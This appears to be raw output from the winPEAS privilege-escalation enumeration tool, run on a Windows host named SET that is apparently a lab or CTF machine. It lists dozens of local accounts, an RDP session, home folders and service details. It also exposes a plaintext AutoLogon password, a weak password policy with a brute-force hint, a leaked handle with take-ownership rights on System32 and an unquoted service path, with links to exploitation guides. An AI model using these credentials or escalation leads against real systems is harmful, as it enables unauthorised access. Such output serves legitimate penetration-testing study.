   User Id                 :   2058
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:19 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   GabrielAll
   User Id                 :   2047
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:17 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   GertrudeWil
   User Id                 :   2095
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:25 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   GilbertTay
   User Id                 :   2051
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:18 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   GlendaSny
   User Id                 :   2056
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:19 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   GordonBan
   User Id                 :   2025
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:14 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   HarveyRey
   User Id                 :   2008
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:12 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   HeidiWat
   User Id                 :   2019
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:14 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   HerminiaCol
   User Id                 :   1979
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:08 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   HollyWel
   User Id                 :   2018
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:13 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   HughFos
   User Id                 :   1991
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:09 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   IvanRay
   User Id                 :   2052
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:18 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   JamieGra
   User Id                 :   2090
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:24 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   JaniceKim
   User Id                 :   2059
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:19 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   JasonPer
   User Id                 :   2082
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:23 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   JaydenHun
   User Id                 :   1982
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:08 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   JillBec
   User Id                 :   2009
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:12 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   JimmieBar
   User Id                 :   2066
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:20 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   JimmyPor
   User Id                 :   2084
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:23 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   JoseByr
   User Id                 :   2097
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:25 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   JuanitaRam
   User Id                 :   2088
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:24 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   JulioCra
   User Id                 :   2081
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:23 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   KayHar
   User Id                 :   2005
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:11 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   KellyJen
   User Id                 :   2049
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:18 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   KittyMar
   User Id                 :   2044
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:17 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   KristinFre
   User Id                 :   2026
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:15 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   LeahBur
   User Id                 :   2033
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:16 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   LeahLar
   User Id                 :   2060
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:19 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   LenaMoo
   User Id                 :   2075
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:22 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   LesaRog
   User Id                 :   2092
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:24 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   MaeGut
   User Id                 :   2071
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:21 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   MarjorieAda
   User Id                 :   2036
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:16 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   MasonMor
   User Id                 :   2096
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:25 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   MaxDou
   User Id                 :   2035
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:16 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   MeghanCha
   User Id                 :   2023
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:14 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   MeghanHol
   User Id                 :   1984
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:08 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   MichelleWat
   User Id                 :   2014
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/2/2023 9:46:46 AM
   Logons Count            :   22
   Password Last Set       :   6/15/2020 9:57:14 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   MiriamWar
   User Id                 :   2053
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:18 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   MyrtleOwe
   User Id                 :   2041
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/2/2023 9:23:37 AM
   Logons Count            :   1
   Password Last Set       :   6/16/2020 11:53:51 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   NatalieArm
   User Id                 :   2076
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:22 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   NataliePen
   User Id                 :   2093
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:25 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   NathanielMar
   User Id                 :   2078
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:22 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   NicholasRam
   User Id                 :   2067
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:20 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   NormanAnd
   User Id                 :   2042
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:17 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   NormanTur
   User Id                 :   2072
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:21 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   One
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :
   Last Logon              :   1/2/2023 6:45:58 AM
   Logons Count            :   23
   Password Last Set       :   6/7/2020 6:56:25 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   OwenKel
   User Id                 :   2064
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:20 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   PamelaGre
   User Id                 :   2024
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:14 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   PeggyHal
   User Id                 :   1993
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:10 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   PennyRay
   User Id                 :   2062
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:20 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   PeytonJam
   User Id                 :   2007
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:12 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   PhyllisRic
   User Id                 :   2068
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:21 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   PriscillaNew
   User Id                 :   2013
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:13 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   RandyGre
   User Id                 :   1999
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:11 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   ReneeLuc
   User Id                 :   1992
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:10 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   RickyRee
   User Id                 :   2010
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:12 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   RobertaPhi
   User Id                 :   1986
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:09 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   RodneyHen
   User Id                 :   2057
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:19 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   RogerMey
   User Id                 :   2061
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:19 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   RosemaryWes
   User Id                 :   2070
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:21 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   RoseNew
   User Id                 :   2055
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:19 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   RossPow
   User Id                 :   2046
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:17 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   RoyMas
   User Id                 :   2000
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:11 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   RubenSch
   User Id                 :   1990
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:09 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   SallyHan
   User Id                 :   2063
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:20 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   SallyOrt
   User Id                 :   2079
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:22 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   SallySte
   User Id                 :   2043
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:17 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   SalvadorLee
   User Id                 :   1983
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:08 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   SethHic
   User Id                 :   2029
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:15 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   SohamKel
   User Id                 :   2003
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:11 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   SohamTuc
   User Id                 :   2034
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:16 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   SophiaBoy
   User Id                 :   2069
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:21 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   StephanieRey
   User Id                 :   2028
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:15 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   SusanSta
   User Id                 :   2011
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:13 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   TammyJoh
   User Id                 :   2015
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:13 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   ThomasWeb
   User Id                 :   1980
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:08 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   TomAnd
   User Id                 :   2077
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:22 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   VeraNic
   User Id                 :   2074
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:22 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   VivanGar
   User Id                 :   1995
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:10 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   WadeRey
   User Id                 :   2054
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:18 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   WalterPal
   User Id                 :   1988
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:09 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   WayneWoo
   User Id                 :   2083
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:23 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/7/2020 10:59:51 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   WendyRob
   User Id                 :   2065
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:20 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   WyattWhe
   User Id                 :   2022
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:14 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   ZackSul
   User Id                 :   1998
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:10 AM

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    1         Console        MichelleWat    SET                      Active

ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\MichelleWat : MichelleWat [AllAccess]
    C:\Users\MyrtleOwe
    C:\Users\One
    C:\Users\Public

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  MichelleWat
    DefaultPassword               :  !!!MICKEYmouse

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
È Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: SET
    SID: S-1-5-21-2146754214-159084425-2869734154
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Processes Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Vulnerable Leaked Handlers
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation
    Handle: 1092(file)
    Handle Owner: Pid is 3172(winPEASany_ofs) with owner: MichelleWat
    Reason: TakeOwnership
    File Path: \Windows\System32
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================



ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.                                                                                                        

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                        
  [X] Exception: Access denied 
    Amazon SSM Agent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Manual
    Amazon SSM Agent
   =================================================================================================          

    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot                                                                                                     
   =================================================================================================

    AWS Lite Guest Agent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Autoload - No quotes and Space detected
    AWS Lite Guest Agent
   =================================================================================================          

    @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(QLogic Corporation - @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[System32\drivers\bxvbda.sys] - Boot
   =================================================================================================

    @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service(Windows (R) Win 7 DDK provider - @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service)[C:\windows\System32\drivers\bcmfn2.sys] - System
   =================================================================================================

    @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver(QLogic Corporation - @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver)[System32\drivers\bxfcoe.sys] - Boot
   =================================================================================================

    @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver(QLogic Corporation - @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver)[System32\drivers\bxois.sys] - Boot
   =================================================================================================

    @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[C:\windows\System32\drivers\cht4vx64.sys] - System
   =================================================================================================

    @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I(Intel Corporation - @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I)[C:\windows\System32\drivers\e1i63x64.sys] - System
   =================================================================================================

    @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(QLogic Corporation - @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[System32\drivers\evbda.sys] - Boot
   =================================================================================================

    @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver(Intel Corporation - @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver)[C:\windows\System32\drivers\iaLPSSi_GPIO.sys] - System                                                                                     
   =================================================================================================

